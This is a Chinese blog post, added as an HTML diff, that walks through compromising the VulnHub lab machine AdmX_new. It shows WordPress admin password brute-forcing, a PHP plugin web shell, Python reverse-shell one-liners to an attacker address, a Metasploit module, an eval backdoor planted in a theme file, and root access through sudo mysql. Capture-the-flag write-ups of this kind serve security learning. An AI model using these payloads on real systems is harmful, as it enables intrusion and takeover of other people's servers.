@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="felzl">
+
+
+
+
+
+<title>AdmX_new(打靶系列-4) | felzl</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Felzl&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Felzl&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">AdmX_new(打靶系列-4)</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">felzl</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">December 22, 2021&nbsp;&nbsp;0:02:43</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%89%93%E9%9D%B6%E7%B3%BB%E5%88%97/">打靶系列</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <ul>
+<li><p>靶机地址</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://download.vulnhub.com/admx/AdmX_new.7z">https://download.vulnhub.com/admx/AdmX_new.7z</a></li>
+</ul>
+</li>
+<li><p>难度：中</p>
+<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3></li>
+<li><p>主机发现</p>
+</li>
+<li><p>端口扫描</p>
+</li>
+<li><p>WEB路径爆破</p>
+</li>
+<li><p>BurpSuite内容替换</p>
+</li>
+<li><p>密码爆破</p>
+</li>
+<li><p>MSF漏洞利用</p>
+</li>
+<li><p>Wordpress后台漏洞利用</p>
+</li>
+<li><p>升级Full TTY终端</p>
+</li>
+<li><p>蚁剑上线</p>
+</li>
+<li><p>利用MySQL提权</p>
+<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3></li>
+<li><p>主机发现</p>
+<ul>
+<li>nmap -sn 192.168.2.0/24</li>
+<li>发现192.168.2.143开发80端口</li>
+</ul>
+</li>
+<li><p>nmap -p80 -sV 192.168.2.143</p>
+<ul>
+<li>apache 2.4.41(ubuntu)</li>
+</ul>
+</li>
+<li><p>feroxbuster</p>
+<ul>
+<li>目录扫描</li>
+<li>安装时没有带字典<ul>
+<li>安装字典：apt install seclists</li>
+</ul>
+</li>
+<li>feroxbuster –url <a target="_blank" rel="noopener" href="http://192.168.2.143/">http://192.168.2.143</a></li>
+<li>自己指定字典<ul>
+<li>-w /usr/share/dirb/wordlists/common.txt</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>发现<a target="_blank" rel="noopener" href="http://192.168.2.143/wordpress/">http://192.168.2.143/wordpress/</a></p>
+<ul>
+<li>但请求速度很慢，用BP抓包发现它要请求很多192.168.159.145的资源</li>
+<li>在BP的 options-&gt;match and replace 中增加 所有响应包的192.168.159.145替换成192.168.2.143</li>
+</ul>
+</li>
+<li><p>发现后台 <a target="_blank" rel="noopener" href="http://192.168.2.143/wordpress/wp-admin">http://192.168.2.143/wordpress/wp-admin</a></p>
+<ul>
+<li>后台明确提示用户名错还是密码错</li>
+<li>测试存在admin</li>
+<li>进行密码破解，最好BP专业版不然很慢<ul>
+<li>/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt</li>
+</ul>
+</li>
+<li>adam14</li>
+</ul>
+</li>
+<li><p>发现后台添加插件的地方可以上传插件</p>
+<ul>
+<li>自己做一个插件<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Plugin Name: WordPress.org Plugin</span></span><br><span class="line"><span class="comment">Plugin URI:  https://developer.wordpress.org/plugins/the-basics/</span></span><br><span class="line"><span class="comment">Description: Basic WordPress Plugin Header Comment</span></span><br><span class="line"><span class="comment">Version:     20160911</span></span><br><span class="line"><span class="comment">Author:      WordPress.org</span></span><br><span class="line"><span class="comment">Author URI:  https://developer.wordpress.org/</span></span><br><span class="line"><span class="comment">License:     GPL2</span></span><br><span class="line"><span class="comment">License URI: https://www.gnu.org/licenses/gpl-2.0.html</span></span><br><span class="line"><span class="comment">Text Domain: wporg</span></span><br><span class="line"><span class="comment">Domain Path: /languages</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*上面的信息是插件必须的*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>将php文件压缩成zip，上传</p>
+<ul>
+<li>zip shell.zip shell.php</li>
+</ul>
+</li>
+<li><p>测试</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://192.168.2.143/wordpress/wp-content/plugins/shell.php?cmd=id">http://192.168.2.143/wordpress/wp-content/plugins/shell.php?cmd=id</a></li>
+</ul>
+</li>
+<li><p>which python3</p>
+<ul>
+<li>存在python3的环境</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.2.142&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.2.142&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>测试利用msf获取shell</p>
+<ul>
+<li>msfdb run</li>
+<li>search wordpress admin</li>
+<li>use exploit/unix/webapp/wp_admin_shell_upload</li>
+<li>set PASSWORD adam14</li>
+<li>set RHOSTS 192.168.2.143</li>
+<li>set TARGETURI /wordpress</li>
+<li>set USERNAME admin</li>
+<li>set LHOST 192.168.2.142</li>
+<li>run</li>
+<li>shell</li>
+</ul>
+</li>
+<li><p>在已有shell的情况下再生成蚁剑shell</p>
+<ul>
+<li>cd wp-content/themes/twentytwentyone</li>
+<li>vi 404.php</li>
+<li>进入vi后发现无法交互</li>
+<li>先升级shell（只适用于bash）</li>
+<li>首先攻击者要使用bash<ul>
+<li>查看：echo $0 或 echo $SHELL</li>
+<li>修改：chsh -s /bin/bash</li>
+<li>重启</li>
+<li>重启后，自己IP变为了 144 ，之前的BP设置要再设</li>
+</ul>
+</li>
+<li>ctrl+z </li>
+<li>stty raw -echo</li>
+<li>fg</li>
+<li>export SHELL=/bin/bash</li>
+<li>export TERM=screen</li>
+<li>stty rows 38 columns 116</li>
+<li>reset</li>
+<li>到此已经升级成可交互，补全的shell了</li>
+<li>ctrl + - 减小当时字体，避免进入vi时有显示问题</li>
+<li>vi wp-content/themes/twentytwentyone/404.php</li>
+<li>如果还有显示问题，退出再次缩小</li>
+<li>在404.php中加入 <code>eval($_POST[&#39;ant&#39;]);</code></li>
+</ul>
+</li>
+<li><p>启动蚁剑</p>
+<ul>
+<li>./AntSword </li>
+<li>连接：<a target="_blank" rel="noopener" href="http://192.168.2.143/wordpress/wp-content/themes/twentytwentyone/404.php">http://192.168.2.143/wordpress/wp-content/themes/twentytwentyone/404.php</a></li>
+<li>密码：ant</li>
+<li>测试成功</li>
+</ul>
+</li>
+<li><p>cat /etc/passwd</p>
+<ul>
+<li>查看当前系统可用账号</li>
+<li>发现wpadmin</li>
+</ul>
+</li>
+<li><p>提权</p>
+<ul>
+<li>主流三步不行</li>
+<li>信息收集</li>
+<li>wp-config.php</li>
+<li>发现数据库密码：Wp_Admin#123</li>
+</ul>
+</li>
+<li><p>测试wpadmin的密码</p>
+<ul>
+<li>与web管理相同：adam14</li>
+</ul>
+</li>
+<li><p>再提权</p>
+<ul>
+<li>sudo -l 有机会</li>
+<li>/usr/bin/mysql -u root -D wordpress -p</li>
+</ul>
+</li>
+<li><p>sudo /usr/bin/mysql -u root -D wordpress -p</p>
+<ul>
+<li>密码：adam14</li>
+<li>在数据中有调用系统命令的指令：system(简写：!)<ul>
+<li>sysem id</li>
+<li>! /bin/bash</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>felzl</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://felzl.github.io/2021/12/22/AdmX-new-%E6%89%93%E9%9D%B6%E7%B3%BB%E5%88%97-4/">https://felzl.github.io/2021/12/22/AdmX-new-%E6%89%93%E9%9D%B6%E7%B3%BB%E5%88%97-4/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/kali-linux/"># kali linux</a>
+                    
+                        <a href="/tags/MySQL%E6%8F%90%E6%9D%83/"># MySQL提权</a>
+                    
+                        <a href="/tags/%E8%9A%81%E5%89%91/"># 蚁剑</a>
+                    
+                        <a href="/tags/BurpSuite/"># BurpSuite</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2021/12/11/Chronos-%E6%89%93%E9%9D%B6%E7%B3%BB%E5%88%97-3/">Chronos(打靶系列-3)</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© felzl | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
